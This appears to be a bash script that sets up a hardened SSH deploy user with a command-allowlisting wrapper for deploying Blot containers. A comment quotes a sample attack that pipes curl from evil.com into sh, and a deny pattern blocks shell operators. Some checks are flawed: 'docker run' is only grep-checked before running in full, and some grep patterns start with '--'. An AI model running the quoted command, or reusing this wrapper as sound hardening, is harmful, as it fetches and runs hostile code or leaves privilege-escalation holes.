#!/bin/bash
#
# Setup script to create a hardened SSH deploy user on the EC2 instance
# Run this script on the EC2 instance as root or with sudo
#
# Usage:
#   sudo ./setup-deploy-user.sh [PUBLIC_KEY]
#
# If PUBLIC_KEY is not provided, you'll need to add it manually to
# /home/deploy/.ssh/authorized_keys after running this script

set -euo pipefail

DEPLOY_USER="deploy"
DEPLOY_HOME="/home/${DEPLOY_USER}"
SSH_DIR="${DEPLOY_HOME}/.ssh"
WRAPPER_SCRIPT="/usr/local/bin/deploy-wrapper.sh"
AUDIT_LOG="/var/log/deploy-ssh.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
    exit 1
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    error "Please run as root or with sudo"
fi

log "Setting up hardened deploy user: ${DEPLOY_USER}"

# Create deploy user if it doesn't exist
if id "${DEPLOY_USER}" &>/dev/null; then
    warn "User ${DEPLOY_USER} already exists"
else
    log "Creating user ${DEPLOY_USER}..."
    useradd -m -s /bin/bash "${DEPLOY_USER}" || error "Failed to create user"
fi

# Create SSH directory
log "Setting up SSH directory..."
mkdir -p "${SSH_DIR}"
chmod 700 "${SSH_DIR}"
chown "${DEPLOY_USER}:${DEPLOY_USER}" "${SSH_DIR}"

# Create authorized_keys with command restrictions
log "Setting up SSH authorized_keys with command restrictions..."
if [ -n "${1:-}" ]; then
    PUBLIC_KEY="$1"
    log "Adding provided public key..."
    cat > "${SSH_DIR}/authorized_keys" <<EOF
# GitHub Actions deploy key - restricted to deployment script
# Added: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
command="${WRAPPER_SCRIPT}",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ${PUBLIC_KEY}
EOF
    chmod 600 "${SSH_DIR}/authorized_keys"
    chown "${DEPLOY_USER}:${DEPLOY_USER}" "${SSH_DIR}/authorized_keys"
    log "Public key added to authorized_keys"
else
    warn "No public key provided. You'll need to manually add it to:"
    warn "  ${SSH_DIR}/authorized_keys"
    warn "Format:"
    warn "  command=\"${WRAPPER_SCRIPT}\",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa YOUR_KEY_HERE"
    touch "${SSH_DIR}/authorized_keys"
    chmod 600 "${SSH_DIR}/authorized_keys"
    chown "${DEPLOY_USER}:${DEPLOY_USER}" "${SSH_DIR}/authorized_keys"
fi

# Create deploy wrapper script
log "Creating deploy wrapper script..."
cat > "${WRAPPER_SCRIPT}" <<'WRAPPER_EOF'
#!/bin/bash
#
# Deploy wrapper script - restricts SSH commands to deployment operations only
# This script is executed automatically when the deploy user connects via SSH
#

set -euo pipefail

# Log all commands
LOG_FILE="/var/log/deploy-commands.log"
TIMESTAMP=$(date -u +"%Y-%m-%d %H:%M:%S UTC")
echo "[${TIMESTAMP}] User: ${USER}, Command: ${SSH_ORIGINAL_COMMAND:-none}" >> "${LOG_FILE}"

# Get the original command
ORIGINAL_CMD="${SSH_ORIGINAL_COMMAND:-}"

if [ -z "${ORIGINAL_CMD}" ]; then
    echo "No command provided"
    exit 1
fi

# Security: Reject commands with dangerous shell operators
# This prevents command chaining attacks like: docker pull image; curl evil.com | sh
if echo "${ORIGINAL_CMD}" | grep -qE '[;&|`$<>]|&&|\|\|'; then
    # Exception: Allow specific safe patterns used in deployment
    # 1. docker inspect with pipes to sed (for extracting image hash)
    # 2. docker logs with redirects (for log archiving)
    # 3. mkdir/cd/ls/tail/xargs/rm chains (for log cleanup)
    # 4. || true patterns (for error handling)
    # 5. 2>/dev/null redirects (for suppressing errors)
    # 6. curl with || exit 1 (for health checks)
    
    # Check if it's one of our allowed patterns
    ALLOWED_PATTERN=false
    
    # Pattern 1: docker inspect with sed pipe (for rollback hash extraction)
    # Format: docker inspect --format='{{.Config.Image}}' container 2>/dev/null | sed 's/.*://'
    if echo "${ORIGINAL_CMD}" | grep -qE "^docker inspect --format='\{\{.Config.Image\}\}' blot-container-(blue|green|yellow) 2>/dev/null \| sed 's/.*://'$"; then
        ALLOWED_PATTERN=true
    fi
    
    # Pattern 2: docker inspect with echo fallback (for health checks)
    # Format: docker inspect --format='{{.State.Health.Status}}' container [2>/dev/null] || echo 'unhealthy'
    if echo "${ORIGINAL_CMD}" | grep -qE "^docker inspect --format='\{\{.State.Health.Status\}\}' blot-container-(blue|green|yellow)( 2>/dev/null)? \|\| echo '(unhealthy|starting)'$"; then
        ALLOWED_PATTERN=true
    fi
    
    # Pattern 3: cd && ls | awk chain (for log cleanup)
    # Format: cd '/tmp/blot-deploy-logs/container' && ls -1t | awk 'NR>N'
    if echo "${ORIGINAL_CMD}" | grep -qE "^cd ['\"]?/tmp/blot-deploy-logs/blot-container-(blue|green|yellow)['\"]? && ls -1t \| awk 'NR>[0-9]+'$"; then
        ALLOWED_PATTERN=true
    fi
    
    # Pattern 4: curl with || exit 1 (health checks)
    # Format: curl --fail --max-time N http://localhost:PORT/health || exit 1
    if echo "${ORIGINAL_CMD}" | grep -qE "^curl --fail --max-time [0-9]+ http://localhost:(8088|8089|8090)/health \|\| exit 1$"; then
        ALLOWED_PATTERN=true
    fi
    
    if [ "${ALLOWED_PATTERN}" != "true" ]; then
        echo "Error: Command contains dangerous shell operators: ${ORIGINAL_CMD}"
        echo "[${TIMESTAMP}] BLOCKED (shell operators): ${ORIGINAL_CMD}" >> "${LOG_FILE}"
        exit 1
    fi
fi

# Parse command into array for safer execution
# This prevents shell interpretation of arguments
IFS=' ' read -r -a CMD_ARGS <<< "${ORIGINAL_CMD}"

# Validate command based on first argument
case "${CMD_ARGS[0]:-}" in
    "docker")
        case "${CMD_ARGS[1]:-}" in
            "pull")
                # docker pull - must be followed by ghcr.io/davidmerfield/blot:hash
                if [ "${#CMD_ARGS[@]}" -ne 3 ]; then
                    echo "Error: docker pull requires exactly one image argument"
                    exit 1
                fi
                if [[ ! "${CMD_ARGS[2]}" =~ ^ghcr\.io/davidmerfield/blot:[0-9a-f]{40}$ ]]; then
                    echo "Error: docker pull only allowed for Blot images with commit SHA"
                    exit 1
                fi
                # Safe to execute - reconstruct command from validated args
                exec docker pull "${CMD_ARGS[2]}"
                ;;
            
            "run")
                # docker run - validate all required flags
                # Must include: -d, --restart unless-stopped, --name, --platform, etc.
                DOCKER_RUN_CMD="${ORIGINAL_CMD}"
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "docker run -d"; then
                    echo "Error: docker run must include -d flag"
                    exit 1
                fi
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--restart unless-stopped"; then
                    echo "Error: docker run must include --restart unless-stopped"
                    exit 1
                fi
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--name blot-container-(blue|green|yellow)"; then
                    echo "Error: docker run must be for blot-container-(blue|green|yellow)"
                    exit 1
                fi
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--platform linux/(amd64|arm64)"; then
                    echo "Error: docker run must specify --platform linux/(amd64|arm64)"
                    exit 1
                fi
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "ghcr\.io/davidmerfield/blot:[0-9a-f]{40}$"; then
                    echo "Error: docker run must use Blot image with commit SHA"
                    exit 1
                fi
                # Additional validations for required flags
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "--log-driver json-file"; then
                    echo "Error: docker run must include --log-driver json-file"
                    exit 1
                fi
                if ! echo "${DOCKER_RUN_CMD}" | grep -qE "-v /var/www/blot/data:/usr/src/app/data"; then
                    echo "Error: docker run must include volume mount"
                    exit 1
                fi
                exec ${ORIGINAL_CMD}
                ;;
            
            "rm")
                # docker rm -f container || true (already validated above if contains ||)
                if [ "${#CMD_ARGS[@]}" -lt 3 ]; then
                    echo "Error: docker rm requires container name"
                    exit 1
                fi
                if [[ ! "${CMD_ARGS[2]}" =~ ^blot-container-(blue|green|yellow)$ ]]; then
                    echo "Error: docker rm only allowed for blot containers"
                    exit 1
                fi
                # Handle || true suffix
                if echo "${ORIGINAL_CMD}" | grep -q " || true$"; then
                    exec docker rm -f "${CMD_ARGS[2]}" || true
                else
                    exec docker rm -f "${CMD_ARGS[2]}"
                fi
                ;;
            
            "inspect")
                # docker inspect with format and container name
                # Allow: docker inspect --format='...' container [2>/dev/null] [|| echo ...]
                if [ "${#CMD_ARGS[@]}" -lt 4 ]; then
                    echo "Error: docker inspect requires format and target"
                    exit 1
                fi
                if [[ ! "${CMD_ARGS[3]}" =~ ^(blot-container-(blue|green|yellow)|ghcr\.io/davidmerfield/blot:[0-9a-f]{40})$ ]]; then
                    echo "Error: docker inspect only allowed for blot containers/images"
                    exit 1
                fi
                # For commands with pipes/redirects, validate the full pattern
                if echo "${ORIGINAL_CMD}" | grep -qE "2>/dev/null \| sed 's/.*://'$"; then
                    # This is the rollback hash extraction pattern - already validated above
                    exec ${ORIGINAL_CMD}
                elif echo "${ORIGINAL_CMD}" | grep -qE "( 2>/dev/null)? \|\| echo '(unhealthy|starting)'$"; then
                    # This is the health check pattern - already validated above
                    exec ${ORIGINAL_CMD}
                elif echo "${ORIGINAL_CMD}" | grep -qE "^docker inspect --format="; then
                    # Simple inspect without pipes or redirects
                    exec ${ORIGINAL_CMD}
                else
                    echo "Error: docker inspect command format not allowed"
                    exit 1
                fi
                ;;
            
            "ps")
                # docker ps variations
                if echo "${ORIGINAL_CMD}" | grep -qE "^docker ps( -a)?( --format| --filter)?"; then
                    exec ${ORIGINAL_CMD}
                else
                    echo "Error: docker ps command not allowed"
                    exit 1
                fi
                ;;
            
            "image")
                # docker image prune -af
                if [ "${#CMD_ARGS[@]}" -eq 4 ] && [ "${CMD_ARGS[2]}" = "prune" ] && [ "${CMD_ARGS[3]}" = "-af" ]; then
                    exec docker image prune -af
                else
                    echo "Error: docker image prune only allowed with -af flag"
                    exit 1
                fi
                ;;
            
            "info")
                # docker info --format '{{.Architecture}}'
                if echo "${ORIGINAL_CMD}" | grep -qE "^docker info --format '"; then
                    exec ${ORIGINAL_CMD}
                else
                    echo "Error: docker info only allowed with --format"
                    exit 1
                fi
                ;;
            
            "manifest")
                # docker manifest inspect image
                if [ "${#CMD_ARGS[@]}" -ne 4 ] || [ "${CMD_ARGS[2]}" != "inspect" ]; then
                    echo "Error: docker manifest inspect requires image argument"
                    exit 1
                fi
                if [[ ! "${CMD_ARGS[3]}" =~ ^ghcr\.io/davidmerfield/blot:[0-9a-f]{40}$ ]]; then
                    echo "Error: docker manifest inspect only allowed for Blot images with commit SHA"
                    exit 1
                fi
                exec docker manifest inspect "${CMD_ARGS[3]}"
                ;;
            
            "logs")
                # docker logs --tail N container
                if [ "${#CMD_ARGS[@]}" -lt 3 ]; then
                    echo "Error: docker logs requires container name"
                    exit 1
                fi
                # Get the last argument (container name) - could be at different positions
                CONTAINER_NAME=""
                if [ "${#CMD_ARGS[@]}" -eq 4 ] && [ "${CMD_ARGS[2]}" = "--tail" ] && [[ "${CMD_ARGS[3]}" =~ ^[0-9]+$ ]]; then
                    # Format: docker logs --tail N container (but container is missing in this case)
                    echo "Error: docker logs --tail requires container name"
                    exit 1
                elif [ "${#CMD_ARGS[@]}" -eq 5 ] && [ "${CMD_ARGS[2]}" = "--tail" ] && [[ "${CMD_ARGS[3]}" =~ ^[0-9]+$ ]]; then
                    # Format: docker logs --tail N container
                    CONTAINER_NAME="${CMD_ARGS[4]}"
                elif [ "${#CMD_ARGS[@]}" -eq 3 ]; then
                    # Format: docker logs container (for log archiving with redirects - already validated above)
                    CONTAINER_NAME="${CMD_ARGS[2]}"
                else
                    echo "Error: docker logs command format not allowed"
                    exit 1
                fi
                if [[ ! "${CONTAINER_NAME}" =~ ^blot-container-(blue|green|yellow)$ ]]; then
                    echo "Error: docker logs only allowed for blot containers"
                    exit 1
                fi
                # If it has redirects, it's part of log archiving chain (already validated above)
                if echo "${ORIGINAL_CMD}" | grep -qE "2>&1"; then
                    exec ${ORIGINAL_CMD}
                elif [ "${#CMD_ARGS[@]}" -eq 5 ]; then
                    exec docker logs --tail "${CMD_ARGS[3]}" "${CMD_ARGS[4]}"
                else
                    exec docker logs "${CMD_ARGS[2]}"
                fi
                ;;
            
            *)
                echo "Error: docker subcommand not allowed: ${CMD_ARGS[1]:-}"
                exit 1
                ;;
        esac
        ;;
    
    "curl")
        # curl --fail --max-time N http://localhost:PORT/health [>/dev/null 2>&1] [|| exit 1]
        # Already validated above if it contains redirects or || exit 1
        if echo "${ORIGINAL_CMD}" | grep -qE "^curl --fail --max-time [0-9]+ http://localhost:(8088|8089|8090)/health"; then
            exec ${ORIGINAL_CMD}
        else
            echo "Error: curl only allowed for health checks on localhost"
            exit 1
        fi
        ;;
    
    "test")
        # test -d /path or test -f /path (for validation)
        if [ "${#CMD_ARGS[@]}" -eq 3 ] && [[ "${CMD_ARGS[1]}" =~ ^-[df]$ ]]; then
            if [[ "${CMD_ARGS[2]}" =~ ^(/var/www/blot/data|/etc/blot/secrets.env|/tmp) ]]; then
                exec test "${CMD_ARGS[1]}" "${CMD_ARGS[2]}"
            fi
        fi
        echo "Error: test command not allowed for this path"
        exit 1
        ;;
    
    "mkdir")
        # mkdir -p /tmp/blot-deploy-logs/container (standalone or in chain)
        if [ "${#CMD_ARGS[@]}" -eq 3 ] && [ "${CMD_ARGS[1]}" = "-p" ]; then
            if [[ "${CMD_ARGS[2]}" =~ ^/tmp/blot-deploy-logs/blot-container-(blue|green|yellow)(/.*)?$ ]]; then
                exec mkdir -p "${CMD_ARGS[2]}"
            fi
        fi
        echo "Error: mkdir only allowed for log directories"
        exit 1
        ;;
    
    "mv")
        # mv -f /tmp/path /tmp/path (for log archiving)
        if [ "${#CMD_ARGS[@]}" -eq 4 ] && [ "${CMD_ARGS[1]}" = "-f" ]; then
            if [[ "${CMD_ARGS[2]}" =~ ^/tmp/blot-deploy-logs/ ]] && [[ "${CMD_ARGS[3]}" =~ ^/tmp/blot-deploy-logs/ ]]; then
                exec mv -f "${CMD_ARGS[2]}" "${CMD_ARGS[3]}"
            fi
        fi
        echo "Error: mv only allowed for log files"
        exit 1
        ;;
    
    "cd")
        # cd /tmp/blot-deploy-logs/container && ls -1t | awk ... (for log cleanup)
        # Only allow as part of validated log cleanup chain
        # Pattern: cd '/tmp/blot-deploy-logs/container' && ls -1t | awk 'NR>N'
        if echo "${ORIGINAL_CMD}" | grep -qE "^cd ['\"]?/tmp/blot-deploy-logs/blot-container-(blue|green|yellow)['\"]? && ls -1t \| awk 'NR>[0-9]+'$"; then
            exec ${ORIGINAL_CMD}
        fi
        echo "Error: cd only allowed as part of log cleanup chain"
        exit 1
        ;;
    
    "ls")
        # ls -1t | awk ... (for log cleanup, only in chain with cd)
        # This should only be reached if cd validation passed
        if echo "${ORIGINAL_CMD}" | grep -qE "^ls -1t \| awk 'NR>[0-9]+'$"; then
            exec ${ORIGINAL_CMD}
        fi
        echo "Error: ls only allowed as part of log cleanup chain"
        exit 1
        ;;
    
    "rm")
        # rm -f -- /tmp/path (for log cleanup)
        if [ "${#CMD_ARGS[@]}" -ge 3 ] && [ "${CMD_ARGS[1]}" = "-f" ] && [ "${CMD_ARGS[2]}" = "--" ]; then
            if [[ "${CMD_ARGS[3]}" =~ ^/tmp/blot-deploy-logs/blot-container-(blue|green|yellow)/ ]]; then
                exec rm -f -- "${CMD_ARGS[3]}"
            fi
        fi
        echo "Error: rm only allowed for log files"
        exit 1
        ;;
    
    "echo")
        # echo 'SSH connection successful' or echo 'unhealthy' or echo 'starting' (fallback in health check)
        if [ "${#CMD_ARGS[@]}" -eq 2 ] && [[ "${CMD_ARGS[1]}" =~ ^('SSH connection successful'|'unhealthy'|'starting'|'yes'|'no'|'')$ ]]; then
            exec echo "${CMD_ARGS[1]}"
        else
            echo "Error: echo only allowed for specific messages"
            exit 1
        fi
        ;;
    
    *)
        # Check if it's the log archiving chain (starts with mkdir)
        if echo "${ORIGINAL_CMD}" | grep -qE "^mkdir -p /tmp/blot-deploy-logs/blot-container-(blue|green|yellow) &&"; then
            # Full validation already done above
            exec ${ORIGINAL_CMD}
        else
            echo "Error: Command not allowed: ${ORIGINAL_CMD}"
            echo "[${TIMESTAMP}] BLOCKED: ${ORIGINAL_CMD}" >> "${LOG_FILE}"
            exit 1
        fi
        ;;
esac
WRAPPER_EOF

chmod +x "${WRAPPER_SCRIPT}"
chown root:root "${WRAPPER_SCRIPT}"

# Add deploy user to docker group (so it can run docker without sudo)
log "Adding ${DEPLOY_USER} to docker group..."
if getent group docker > /dev/null 2>&1; then
    usermod -aG docker "${DEPLOY_USER}" || warn "Failed to add to docker group (docker may not be installed)"
else
    warn "Docker group not found - docker may not be installed"
fi

# Set up audit logging
log "Setting up audit logging..."
touch "${AUDIT_LOG}"
chmod 640 "${AUDIT_LOG}"
chown root:adm "${AUDIT_LOG}" 2>/dev/null || chown root:root "${AUDIT_LOG}"

# Create command log file
COMMAND_LOG="/var/log/deploy-commands.log"
touch "${COMMAND_LOG}"
chmod 640 "${COMMAND_LOG}"
chown root:adm "${COMMAND_LOG}" 2>/dev/null || chown root:root "${COMMAND_LOG}"

# Configure rsyslog to log SSH access (if rsyslog is available)
if command -v rsyslogd &> /dev/null; then
    log "Configuring rsyslog for deploy user monitoring..."
    cat > /etc/rsyslog.d/30-deploy-user.conf <<EOF
# Log SSH access by deploy user
:msg, contains, "deploy" ${AUDIT_LOG}
& stop
EOF
    systemctl restart rsyslog 2>/dev/null || warn "Could not restart rsyslog"
fi

# Set up log rotation
log "Setting up log rotation..."
cat > /etc/logrotate.d/deploy-user <<EOF
${AUDIT_LOG}
${COMMAND_LOG} {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
    create 640 root adm
}
EOF

# Configure SSH to restrict deploy user (optional but recommended)
log "Configuring SSH restrictions..."
if [ -f /etc/ssh/sshd_config ]; then
    # Check if Match block already exists
    if ! grep -q "Match User ${DEPLOY_USER}" /etc/ssh/sshd_config; then
        cat >> /etc/ssh/sshd_config <<EOF

# Restrictions for deploy user
Match User ${DEPLOY_USER}
    PermitTTY no
    ForceCommand ${WRAPPER_SCRIPT}
    X11Forwarding no
    AllowAgentForwarding no
    AllowTcpForwarding no
    PermitTunnel no
EOF
        log "SSH configuration updated. Restart SSH service to apply changes:"
        warn "  sudo systemctl restart sshd"
        warn "  (or test with: sudo sshd -t)"
    else
        warn "SSH Match block for ${DEPLOY_USER} already exists"
    fi
else
    warn "SSH config file not found at /etc/ssh/sshd_config"
fi

log ""
log "=========================================="
log "Deploy user setup complete!"
log "=========================================="
log ""
log "User: ${DEPLOY_USER}"
log "Home: ${DEPLOY_HOME}"
log "SSH Key: ${SSH_DIR}/authorized_keys"
log "Wrapper: ${WRAPPER_SCRIPT}"
log "Audit Log: ${AUDIT_LOG}"
log "Command Log: ${COMMAND_LOG}"
log ""
if [ -z "${1:-}" ]; then
    warn "Don't forget to add the public key to:"
    warn "  ${SSH_DIR}/authorized_keys"
fi
log ""
warn "Next steps:"
warn "1. Add the GitHub Actions SSH private key as a secret: DEPLOY_SSH_KEY"
warn "2. Add the EC2 hostname/IP as a secret: EC2_HOST"
warn "3. Test the connection: ssh -i /path/to/key deploy@HOST 'docker ps'"
warn "4. Restart SSH service if you modified sshd_config"
log ""

